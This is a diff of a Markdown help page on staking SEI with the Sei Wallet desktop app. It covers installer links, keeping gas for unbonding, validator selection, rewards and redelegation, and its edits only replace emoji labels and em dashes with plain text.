@@ -12,16 +12,16 @@
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-Staking SEI means delegating it to a validator who produces blocks on your behalf. The coins stay yours — they move from "liquid" to "bonded" inside your own account, not to the validator — but they stop being spendable, and getting them back takes an unbonding period rather than a click.
+Staking SEI means delegating it to a validator who produces blocks on your behalf. The coins stay yours - they move from "liquid" to "bonded" inside your own account, not to the validator - but they stop being spendable, and getting them back takes an unbonding period rather than a click.
 
 Sei Wallet has staking built in, so the whole flow happens in one application: pick a validator, choose an amount, confirm, and watch rewards accrue. The parts worth understanding before you start are the reserve you must leave behind and the timing of an exit.
 
@@ -35,9 +35,9 @@ Sei Wallet has staking built in, so the whole flow happens in one application: p
 
 ## Before you stake: leave yourself gas
 
-This is the trap that catches people who stake everything. Once your entire balance is bonded, you have no liquid SEI to pay the fee for the unbonding transaction. The position is not lost, but you cannot move until SEI arrives at that address from somewhere else — and asking strangers for a small transfer is how people meet scammers.
+This is the trap that catches people who stake everything. Once your entire balance is bonded, you have no liquid SEI to pay the fee for the unbonding transaction. The position is not lost, but you cannot move until SEI arrives at that address from somewhere else - and asking strangers for a small transfer is how people meet scammers.
 
-Leave a small liquid balance — a few SEI is plenty. Think of it as the fare for your own exit: without it, the unstake button has nothing to spend, and the wait begins before the waiting period does. The full failure mode, including what to do if it has already happened, is in [unstaking and the unbonding period](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md).
+Leave a small liquid balance - a few SEI is plenty. Think of it as the fare for your own exit: without it, the unstake button has nothing to spend, and the wait begins before the waiting period does. The full failure mode, including what to do if it has already happened, is in [unstaking and the unbonding period](https://github.com/sei-chain/sei-wallet-staking/blob/main/unbonding-wait-explained.md).
 
 ## The steps
 
@@ -58,19 +58,19 @@ There is no single right answer, but four things are worth checking:
 - **Concentration.** Delegating to a validator that already holds a large share of the network makes the network less decentralised. Spreading stake across several validators is a reasonable default.
 - **Identity and contactability.** A validator that publishes who it is and how to reach it is easier to evaluate than an anonymous one.
 
-None of this requires trusting a claim made in a chat message. Validators do not need to contact you, and any message offering to "help you stake" is a scam pattern regardless of how official it looks — the safety basics are in [is Sei Wallet safe](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).
+None of this requires trusting a claim made in a chat message. Validators do not need to contact you, and any message offering to "help you stake" is a scam pattern regardless of how official it looks - the safety basics are in [is Sei Wallet safe](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).
 
 ## Watching rewards
 
 Rewards accrue to the bonded position and usually need to be claimed before they become liquid. A claimed reward does not create a new position; it increases your available balance. That distinction explains most "my rewards disappeared" confusion, which is covered in [staking rewards not showing](https://github.com/sei-chain/sei-wallet-staking/blob/main/rewards-not-showing-up.md).
 
-Rewards are denominated in the smallest unit of SEI, so a figure like `0.004` may be displayed as a much larger integer in some views. That is a denomination, not a windfall. The unit convention is the same one described in [the address-format guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) — one chain, more than one representation.
+Rewards are denominated in the smallest unit of SEI, so a figure like `0.004` may be displayed as a much larger integer in some views. That is a denomination, not a windfall. The unit convention is the same one described in [the address-format guide](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) - one chain, more than one representation.
 
 ## Redelegating versus unstaking
 
 If you want to move stake from one validator to another, redelegation is usually the right tool: it is immediate and keeps the position bonded. Unstaking is for when you want the coins liquid again, and it starts the unbonding clock.
 
-Redelegation is not unlimited — there are rules about how often and how much can move at once. The constraints and the unbonding timing belong together, and both are covered in the unstaking guide.
+Redelegation is not unlimited - there are rules about how often and how much can move at once. The constraints and the unbonding timing belong together, and both are covered in the unstaking guide.
 
 ## Staking with a hardware wallet
 
@@ -78,7 +78,7 @@ If your Ledger is connected, staking works the same way with one extra confirmat
 
 ## If you would rather not run a desktop app
 
-Staking through MetaMask is not possible — it has no delegation feature on any chain — so the alternative is another wallet with staking support rather than a browser extension trick. The comparison of what each route gives you is in [adding Sei to MetaMask instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md), and the wider picture of what the desktop app does is in [the wallet overview](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).
+Staking through MetaMask is not possible - it has no delegation feature on any chain - so the alternative is another wallet with staking support rather than a browser extension trick. The comparison of what each route gives you is in [adding Sei to MetaMask instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md), and the wider picture of what the desktop app does is in [the wallet overview](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).
 
 ## Frequently asked questions
 
@@ -98,9 +98,9 @@ Staking through MetaMask is not possible — it has no delegation feature on any
 
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
